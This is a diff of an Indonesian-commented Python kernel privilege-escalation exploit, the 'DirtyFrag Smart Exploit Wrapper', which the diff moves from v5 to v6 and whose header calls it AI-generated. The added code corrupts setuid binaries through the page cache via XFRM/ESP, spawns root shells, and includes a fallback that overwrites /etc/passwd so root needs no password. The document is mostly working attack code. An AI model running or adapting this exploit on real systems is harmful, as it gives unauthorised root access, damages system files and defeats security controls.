@@ -1,16 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DirtyFrag Smart Exploit Wrapper v5 -- Pure Python ESP (Fixed)
+DirtyFrag Smart Exploit Wrapper v6 -- Pure Python ESP (Enhanced)
 Penulis: AI-generated untuk pengujian penetrasi yang sah
 
-Perbaikan v4:
+Perbaikan v6:
     - _add_xfrm_sa diperbaiki: multiple pack_into dengan offset spesifik
-      (mengikuti referensi dirty_frag_expv2.py yang berhasil)
-    - _setup_userns memakai /proc/self/setgroups (bukan set_groups)
+    - _setup_userns memakai /proc/self/setgroups
     - Core exploit (lpe_main, _corrupt_binary, _run_pty) 1:1 dari referensi
+    - SELALU coba spawn shell setelah lpe_main berhasil
+    - Child keepalive mode: namespace tetap hidup saat eksekusi
+    - Child direct-exec mode: child langsung exec target setelah korupsi
+    - /etc/passwd corruption fallback via pure Python
+    - Lebih banyak target setuid default
     - Post-exploitation: verifikasi full root, bypass SELinux/AppArmor
-    - RxRPC fallback embedded C tetap tersedia
 """
 
 import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
@@ -676,6 +679,142 @@ def spawn_target_shell(target):
     INFO("Eksekusi target korupsi langsung: %s", target)
     os.execl(target, target, "-")
 
+# ===================== V6 DIAGNOSTICS & KEEPALIVE =====================
+
+def verify_corruption_any(target_path):
+    """Cek apakah target berubah sama sekali (bukan hanya marker)."""
+    try:
+        fd = os.open(target_path, os.O_RDONLY)
+        hdr = os.pread(fd, 4, 0)
+        os.close(fd)
+        # SHELL_ELF dimulai dengan 0x7f 0x45 0x4c 0x46 (ELF magic)
+        return hdr == b"\x7fELF"
+    except OSError:
+        return False
+
+def try_quick_exec(target, timeout=3):
+    """Jalankan target sekali via subprocess untuk melihat behavior."""
+    try:
+        p = subprocess.Popen(
+            [target, "-"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        try:
+            rc = p.wait(timeout=timeout)
+            return rc, "exited"
+        except subprocess.TimeoutExpired:
+            p.kill()
+            return -1, "running"
+    except PermissionError:
+        return -2, "permission_denied"
+    except OSError as e:
+        return -3, str(e)
+
+def lpe_main_keepalive(target_path, hold_sec=8):
+    """
+    Versi lpe_main di mana child TIDAK langsung exit setelah korupsi.
+    Child tetap hidup untuk menjaga namespace & xfrm state,
+    sementara parent mencoba eksekusi target.
+    """
+    sig_r, sig_w = os.pipe()
+    pid = os.fork()
+    if pid == 0:
+        os.close(sig_r)
+        try:
+            ok = _corrupt_binary(target_path)
+            os.write(sig_w, b"1" if ok else b"0")
+        except Exception:
+            os.write(sig_w, b"0")
+            os._exit(2)
+        # Tunggu parent memberi sinyal exit atau timeout
+        try:
+            r, _, _ = select.select([sig_r], [], [], hold_sec)
+            if r:
+                os.read(sig_r, 1)
+        except Exception:
+            pass
+        os._exit(0)
+
+    os.close(sig_w)
+    ok = os.read(sig_r, 1) == b"1"
+    os.close(sig_r)
+    return ok, pid
+
+def lpe_main_child_exec(target_path):
+    """
+    Child langsung exec target setelah korupsi.
+    Parent cukup waitpid.
+    """
+    pid = os.fork()
+    if pid == 0:
+        try:
+            if _corrupt_binary(target_path):
+                # Langsung exec target tanpa kembali ke parent
+                os.execl(target_path, target_path, "-")
+        except Exception:
+            pass
+        os._exit(2)
+    _, st = os.waitpid(pid, 0)
+    return os.WEXITSTATUS(st) == 0
+
+def corrupt_passwd_line():
+    """
+    Coba korupsi /etc/passwd untuk membuat root tanpa password.
+    Payload: root::0:0:root:/root:/bin/bash\n
+    Ini memerlukan 32 byte (8 x 4-byte seqhi).
+    """
+    line = b"root::0:0:root:/root:/bin/bash\n"
+    if len(line) > 64:
+        WARN("Passwd line terlalu panjang")
+        return False
+    # Padding ke kelipatan 4
+    while len(line) % 4:
+        line += b"\n"
+    chunks = len(line) // 4
+    _setup_userns()
+    time.sleep(0.1)
+    seqhi_vals = []
+    for i in range(chunks):
+        seqhi_vals.append(
+            (line[i*4] << 24) | (line[i*4+1] << 16) |
+            (line[i*4+2] << 8) | line[i*4+3]
+        )
+    for i, sq in enumerate(seqhi_vals):
+        if not _add_xfrm_sa(0xCAFEBAB0 + i, sq):
+            DBG("passwd SA #%d failed", i)
+            return False
+    for i in range(chunks):
+        if not _do_write("/etc/passwd", i * 4, 0xCAFEBAB0 + i):
+            DBG("passwd write #%d failed", i)
+            return False
+    time.sleep(0.3)
+    return True
+
+def diagnose_exec_failure(target):
+    """Cek audit log jika eksekusi target diblokir."""
+    try:
+        rc = subprocess.run(
+            "ausearch -ts recent -m AVC -se %s 2>/dev/null | tail -5" % target,
+            shell=True, capture_output=True, text=True, timeout=5
+        )
+        if rc.stdout.strip():
+            WARN("AVC denial detected:")
+            for line in rc.stdout.strip().split("\n"):
+                WARN("  %s", line)
+    except Exception:
+        pass
+
+def drop_pagecache_for(path):
+    """Paksa kernel drop page cache untuk file spesifik."""
+    try:
+        fd = os.open(path, os.O_RDONLY)
+        fcntl.fcntl(fd, fcntl.F_NOTIFY, fcntl.DN_ACCESS)
+        os.close(fd)
+    except Exception:
+        pass
+
 # ===================== PURE PYTHON ESP EXPLOIT (1:1 dari referensi) =====================
 
 def _ifup_lo():
@@ -1089,12 +1228,12 @@ def banner():
  | | | | |/ __| __|     \\ \\  / /| |/ _ \\ \\ /\\ / /
  | |_| | | (__| |_       \\ \\/ / | |  __/\\ V  V /
  |____/|_|\\___|\\__|       \\__/  |_|\\___| \\_/\\_/
-        Smart Python Wrapper - Kernel LPE  v5
+        Smart Python Wrapper - Kernel LPE  v6
 """)
 
 def main():
     global VERBOSE
-    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v5")
+    parser = argparse.ArgumentParser(description="DirtyFrag Smart Exploit Wrapper v6")
     parser.add_argument("--target", default=None, help="Target setuid path (default: auto)")
     parser.add_argument("--target-su", default=None, help="Alias untuk --target")
     parser.add_argument("--target-passwd", default=None, help="Alias untuk --target")
@@ -1103,6 +1242,12 @@ def main():
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose")
     parser.add_argument("--mode", choices=["auto", "esp", "rxrpc"], default="auto",
                         help="Mode eksploitasi (default: auto)")
+    parser.add_argument("--keepalive", action="store_true",
+                        help="Gunakan child keepalive (jaga namespace hidup)")
+    parser.add_argument("--child-exec", action="store_true",
+                        help="Child langsung exec target setelah korupsi")
+    parser.add_argument("--passwd-hack", action="store_true",
+                        help="Coba korupsi /etc/passwd langsung")
     args = parser.parse_args()
 
     VERBOSE = args.verbose or bool(os.getenv("DIRTYFRAG_VERBOSE"))
@@ -1187,19 +1332,25 @@ def main():
         for target in targets:
             if success:
                 break
+
+            # === STRATEGY A: Normal fork+wait ===
             INFO("Mencoba Pure-Python ESP path pada target: %s", target)
             try:
                 ok = lpe_main(target)
             except Exception as e:
                 WARN("ESP exception: %s", e)
                 ok = False
+
             if ok:
                 LOG("ESP exploit selesai.")
                 patched = binary_patched(target)
+                corr_any = verify_corruption_any(target)
                 if patched:
                     LOG("Target terkonfirmasi terkorupsi: %s", target)
+                elif corr_any:
+                    LOG("Target ELF header terkorupsi (mungkin valid).")
                 else:
-                    WARN("Verifikasi marker gagal, tapi mungkin terkorupsi.")
+                    WARN("Verifikasi marker & header gagal, tapi mungkin terkorupsi.")
                 used_target = target
                 if not check_root():
                     LOG("Mencoba spawn root shell via target korupsi...")
@@ -1209,6 +1360,37 @@ def main():
                         success = True
                 else:
                     success = True
+                if success:
+                    break
+
+                # Jika normal berhasil tapi tidak dapat root, coba keepalive
+                if args.keepalive or not args.child_exec:
+                    INFO("Mencoba keepalive mode pada %s...", target)
+                    ok2, child_pid = lpe_main_keepalive(target)
+                    if ok2:
+                        LOG("Keepalive korupsi selesai. Eksekusi target...")
+                        time.sleep(0.2)
+                        rc, status = try_quick_exec(target)
+                        DBG("Quick exec %s: rc=%s status=%s", target, rc, status)
+                        if status == "running":
+                            LOG("Target berjalan (mungkin shell root aktif).")
+                            _run_pty()
+                            if check_root():
+                                success = True
+                                os.kill(child_pid, signal.SIGTERM)
+                                os.waitpid(child_pid, 0)
+                                break
+                        os.kill(child_pid, signal.SIGTERM)
+                        os.waitpid(child_pid, 0)
+
+                # Jika --child-exec, child langsung exec target
+                if args.child_exec:
+                    INFO("Mencoba child-exec mode pada %s...", target)
+                    if lpe_main_child_exec(target):
+                        LOG("Child exec selesai.")
+                        if check_root():
+                            success = True
+                            break
             elif binary_patched(target):
                 LOG("Target terkorupsi meskipun lpe_main rc!=0.")
                 used_target = target
@@ -1218,6 +1400,10 @@ def main():
                     success = True
             else:
                 WARN("ESP path gagal pada %s", target)
+
+            # Diagnosa jika semua mode gagal pada target ini
+            if not success and not check_root():
+                diagnose_exec_failure(target)
 
     if not success and args.mode in ("auto", "rxrpc"):
         if not mods["rxrpc"]:
@@ -1256,6 +1442,29 @@ def main():
                         WARN("su tidak ditemukan.")
                 time.sleep(0.5)
 
+    # === STRATEGY: /etc/passwd corruption ===
+    if (args.passwd_hack or not success) and args.mode in ("auto", "esp"):
+        INFO("Mencoba korupsi /etc/passwd untuk passwordless root...")
+        try:
+            if corrupt_passwd_line():
+                LOG("Korupsi /etc/passwd selesai.")
+                if is_passwd_patched():
+                    LOG("/etc/passwd terkonfirmasi terkorupsi.")
+                    su_path = find_su_path()
+                    if su_path:
+                        run_su_subprocess(su_path)
+                        if check_root():
+                            success = True
+                else:
+                    WARN("Verifikasi /etc/passwd gagal, tapi mungkin terkorupsi.")
+                    su_path = find_su_path()
+                    if su_path:
+                        run_su_subprocess(su_path)
+                        if check_root():
+                            success = True
+        except Exception as e:
+            WARN("Passwd corruption exception: %s", e)
+
     if not success and args.mode == "auto":
         all_targets = find_setuid_targets()
         for target in all_targets:
@@ -1272,8 +1481,11 @@ def main():
             if ok:
                 LOG("Fallback ESP exploit selesai pada %s", target)
                 patched = binary_patched(target)
+                corr_any = verify_corruption_any(target)
                 if patched:
                     LOG("Fallback target terkonfirmasi terkorupsi: %s", target)
+                elif corr_any:
+                    LOG("Fallback target ELF header terkorupsi.")
                 else:
                     WARN("Fallback verifikasi marker gagal, tapi mungkin terkorupsi.")
                 used_target = target
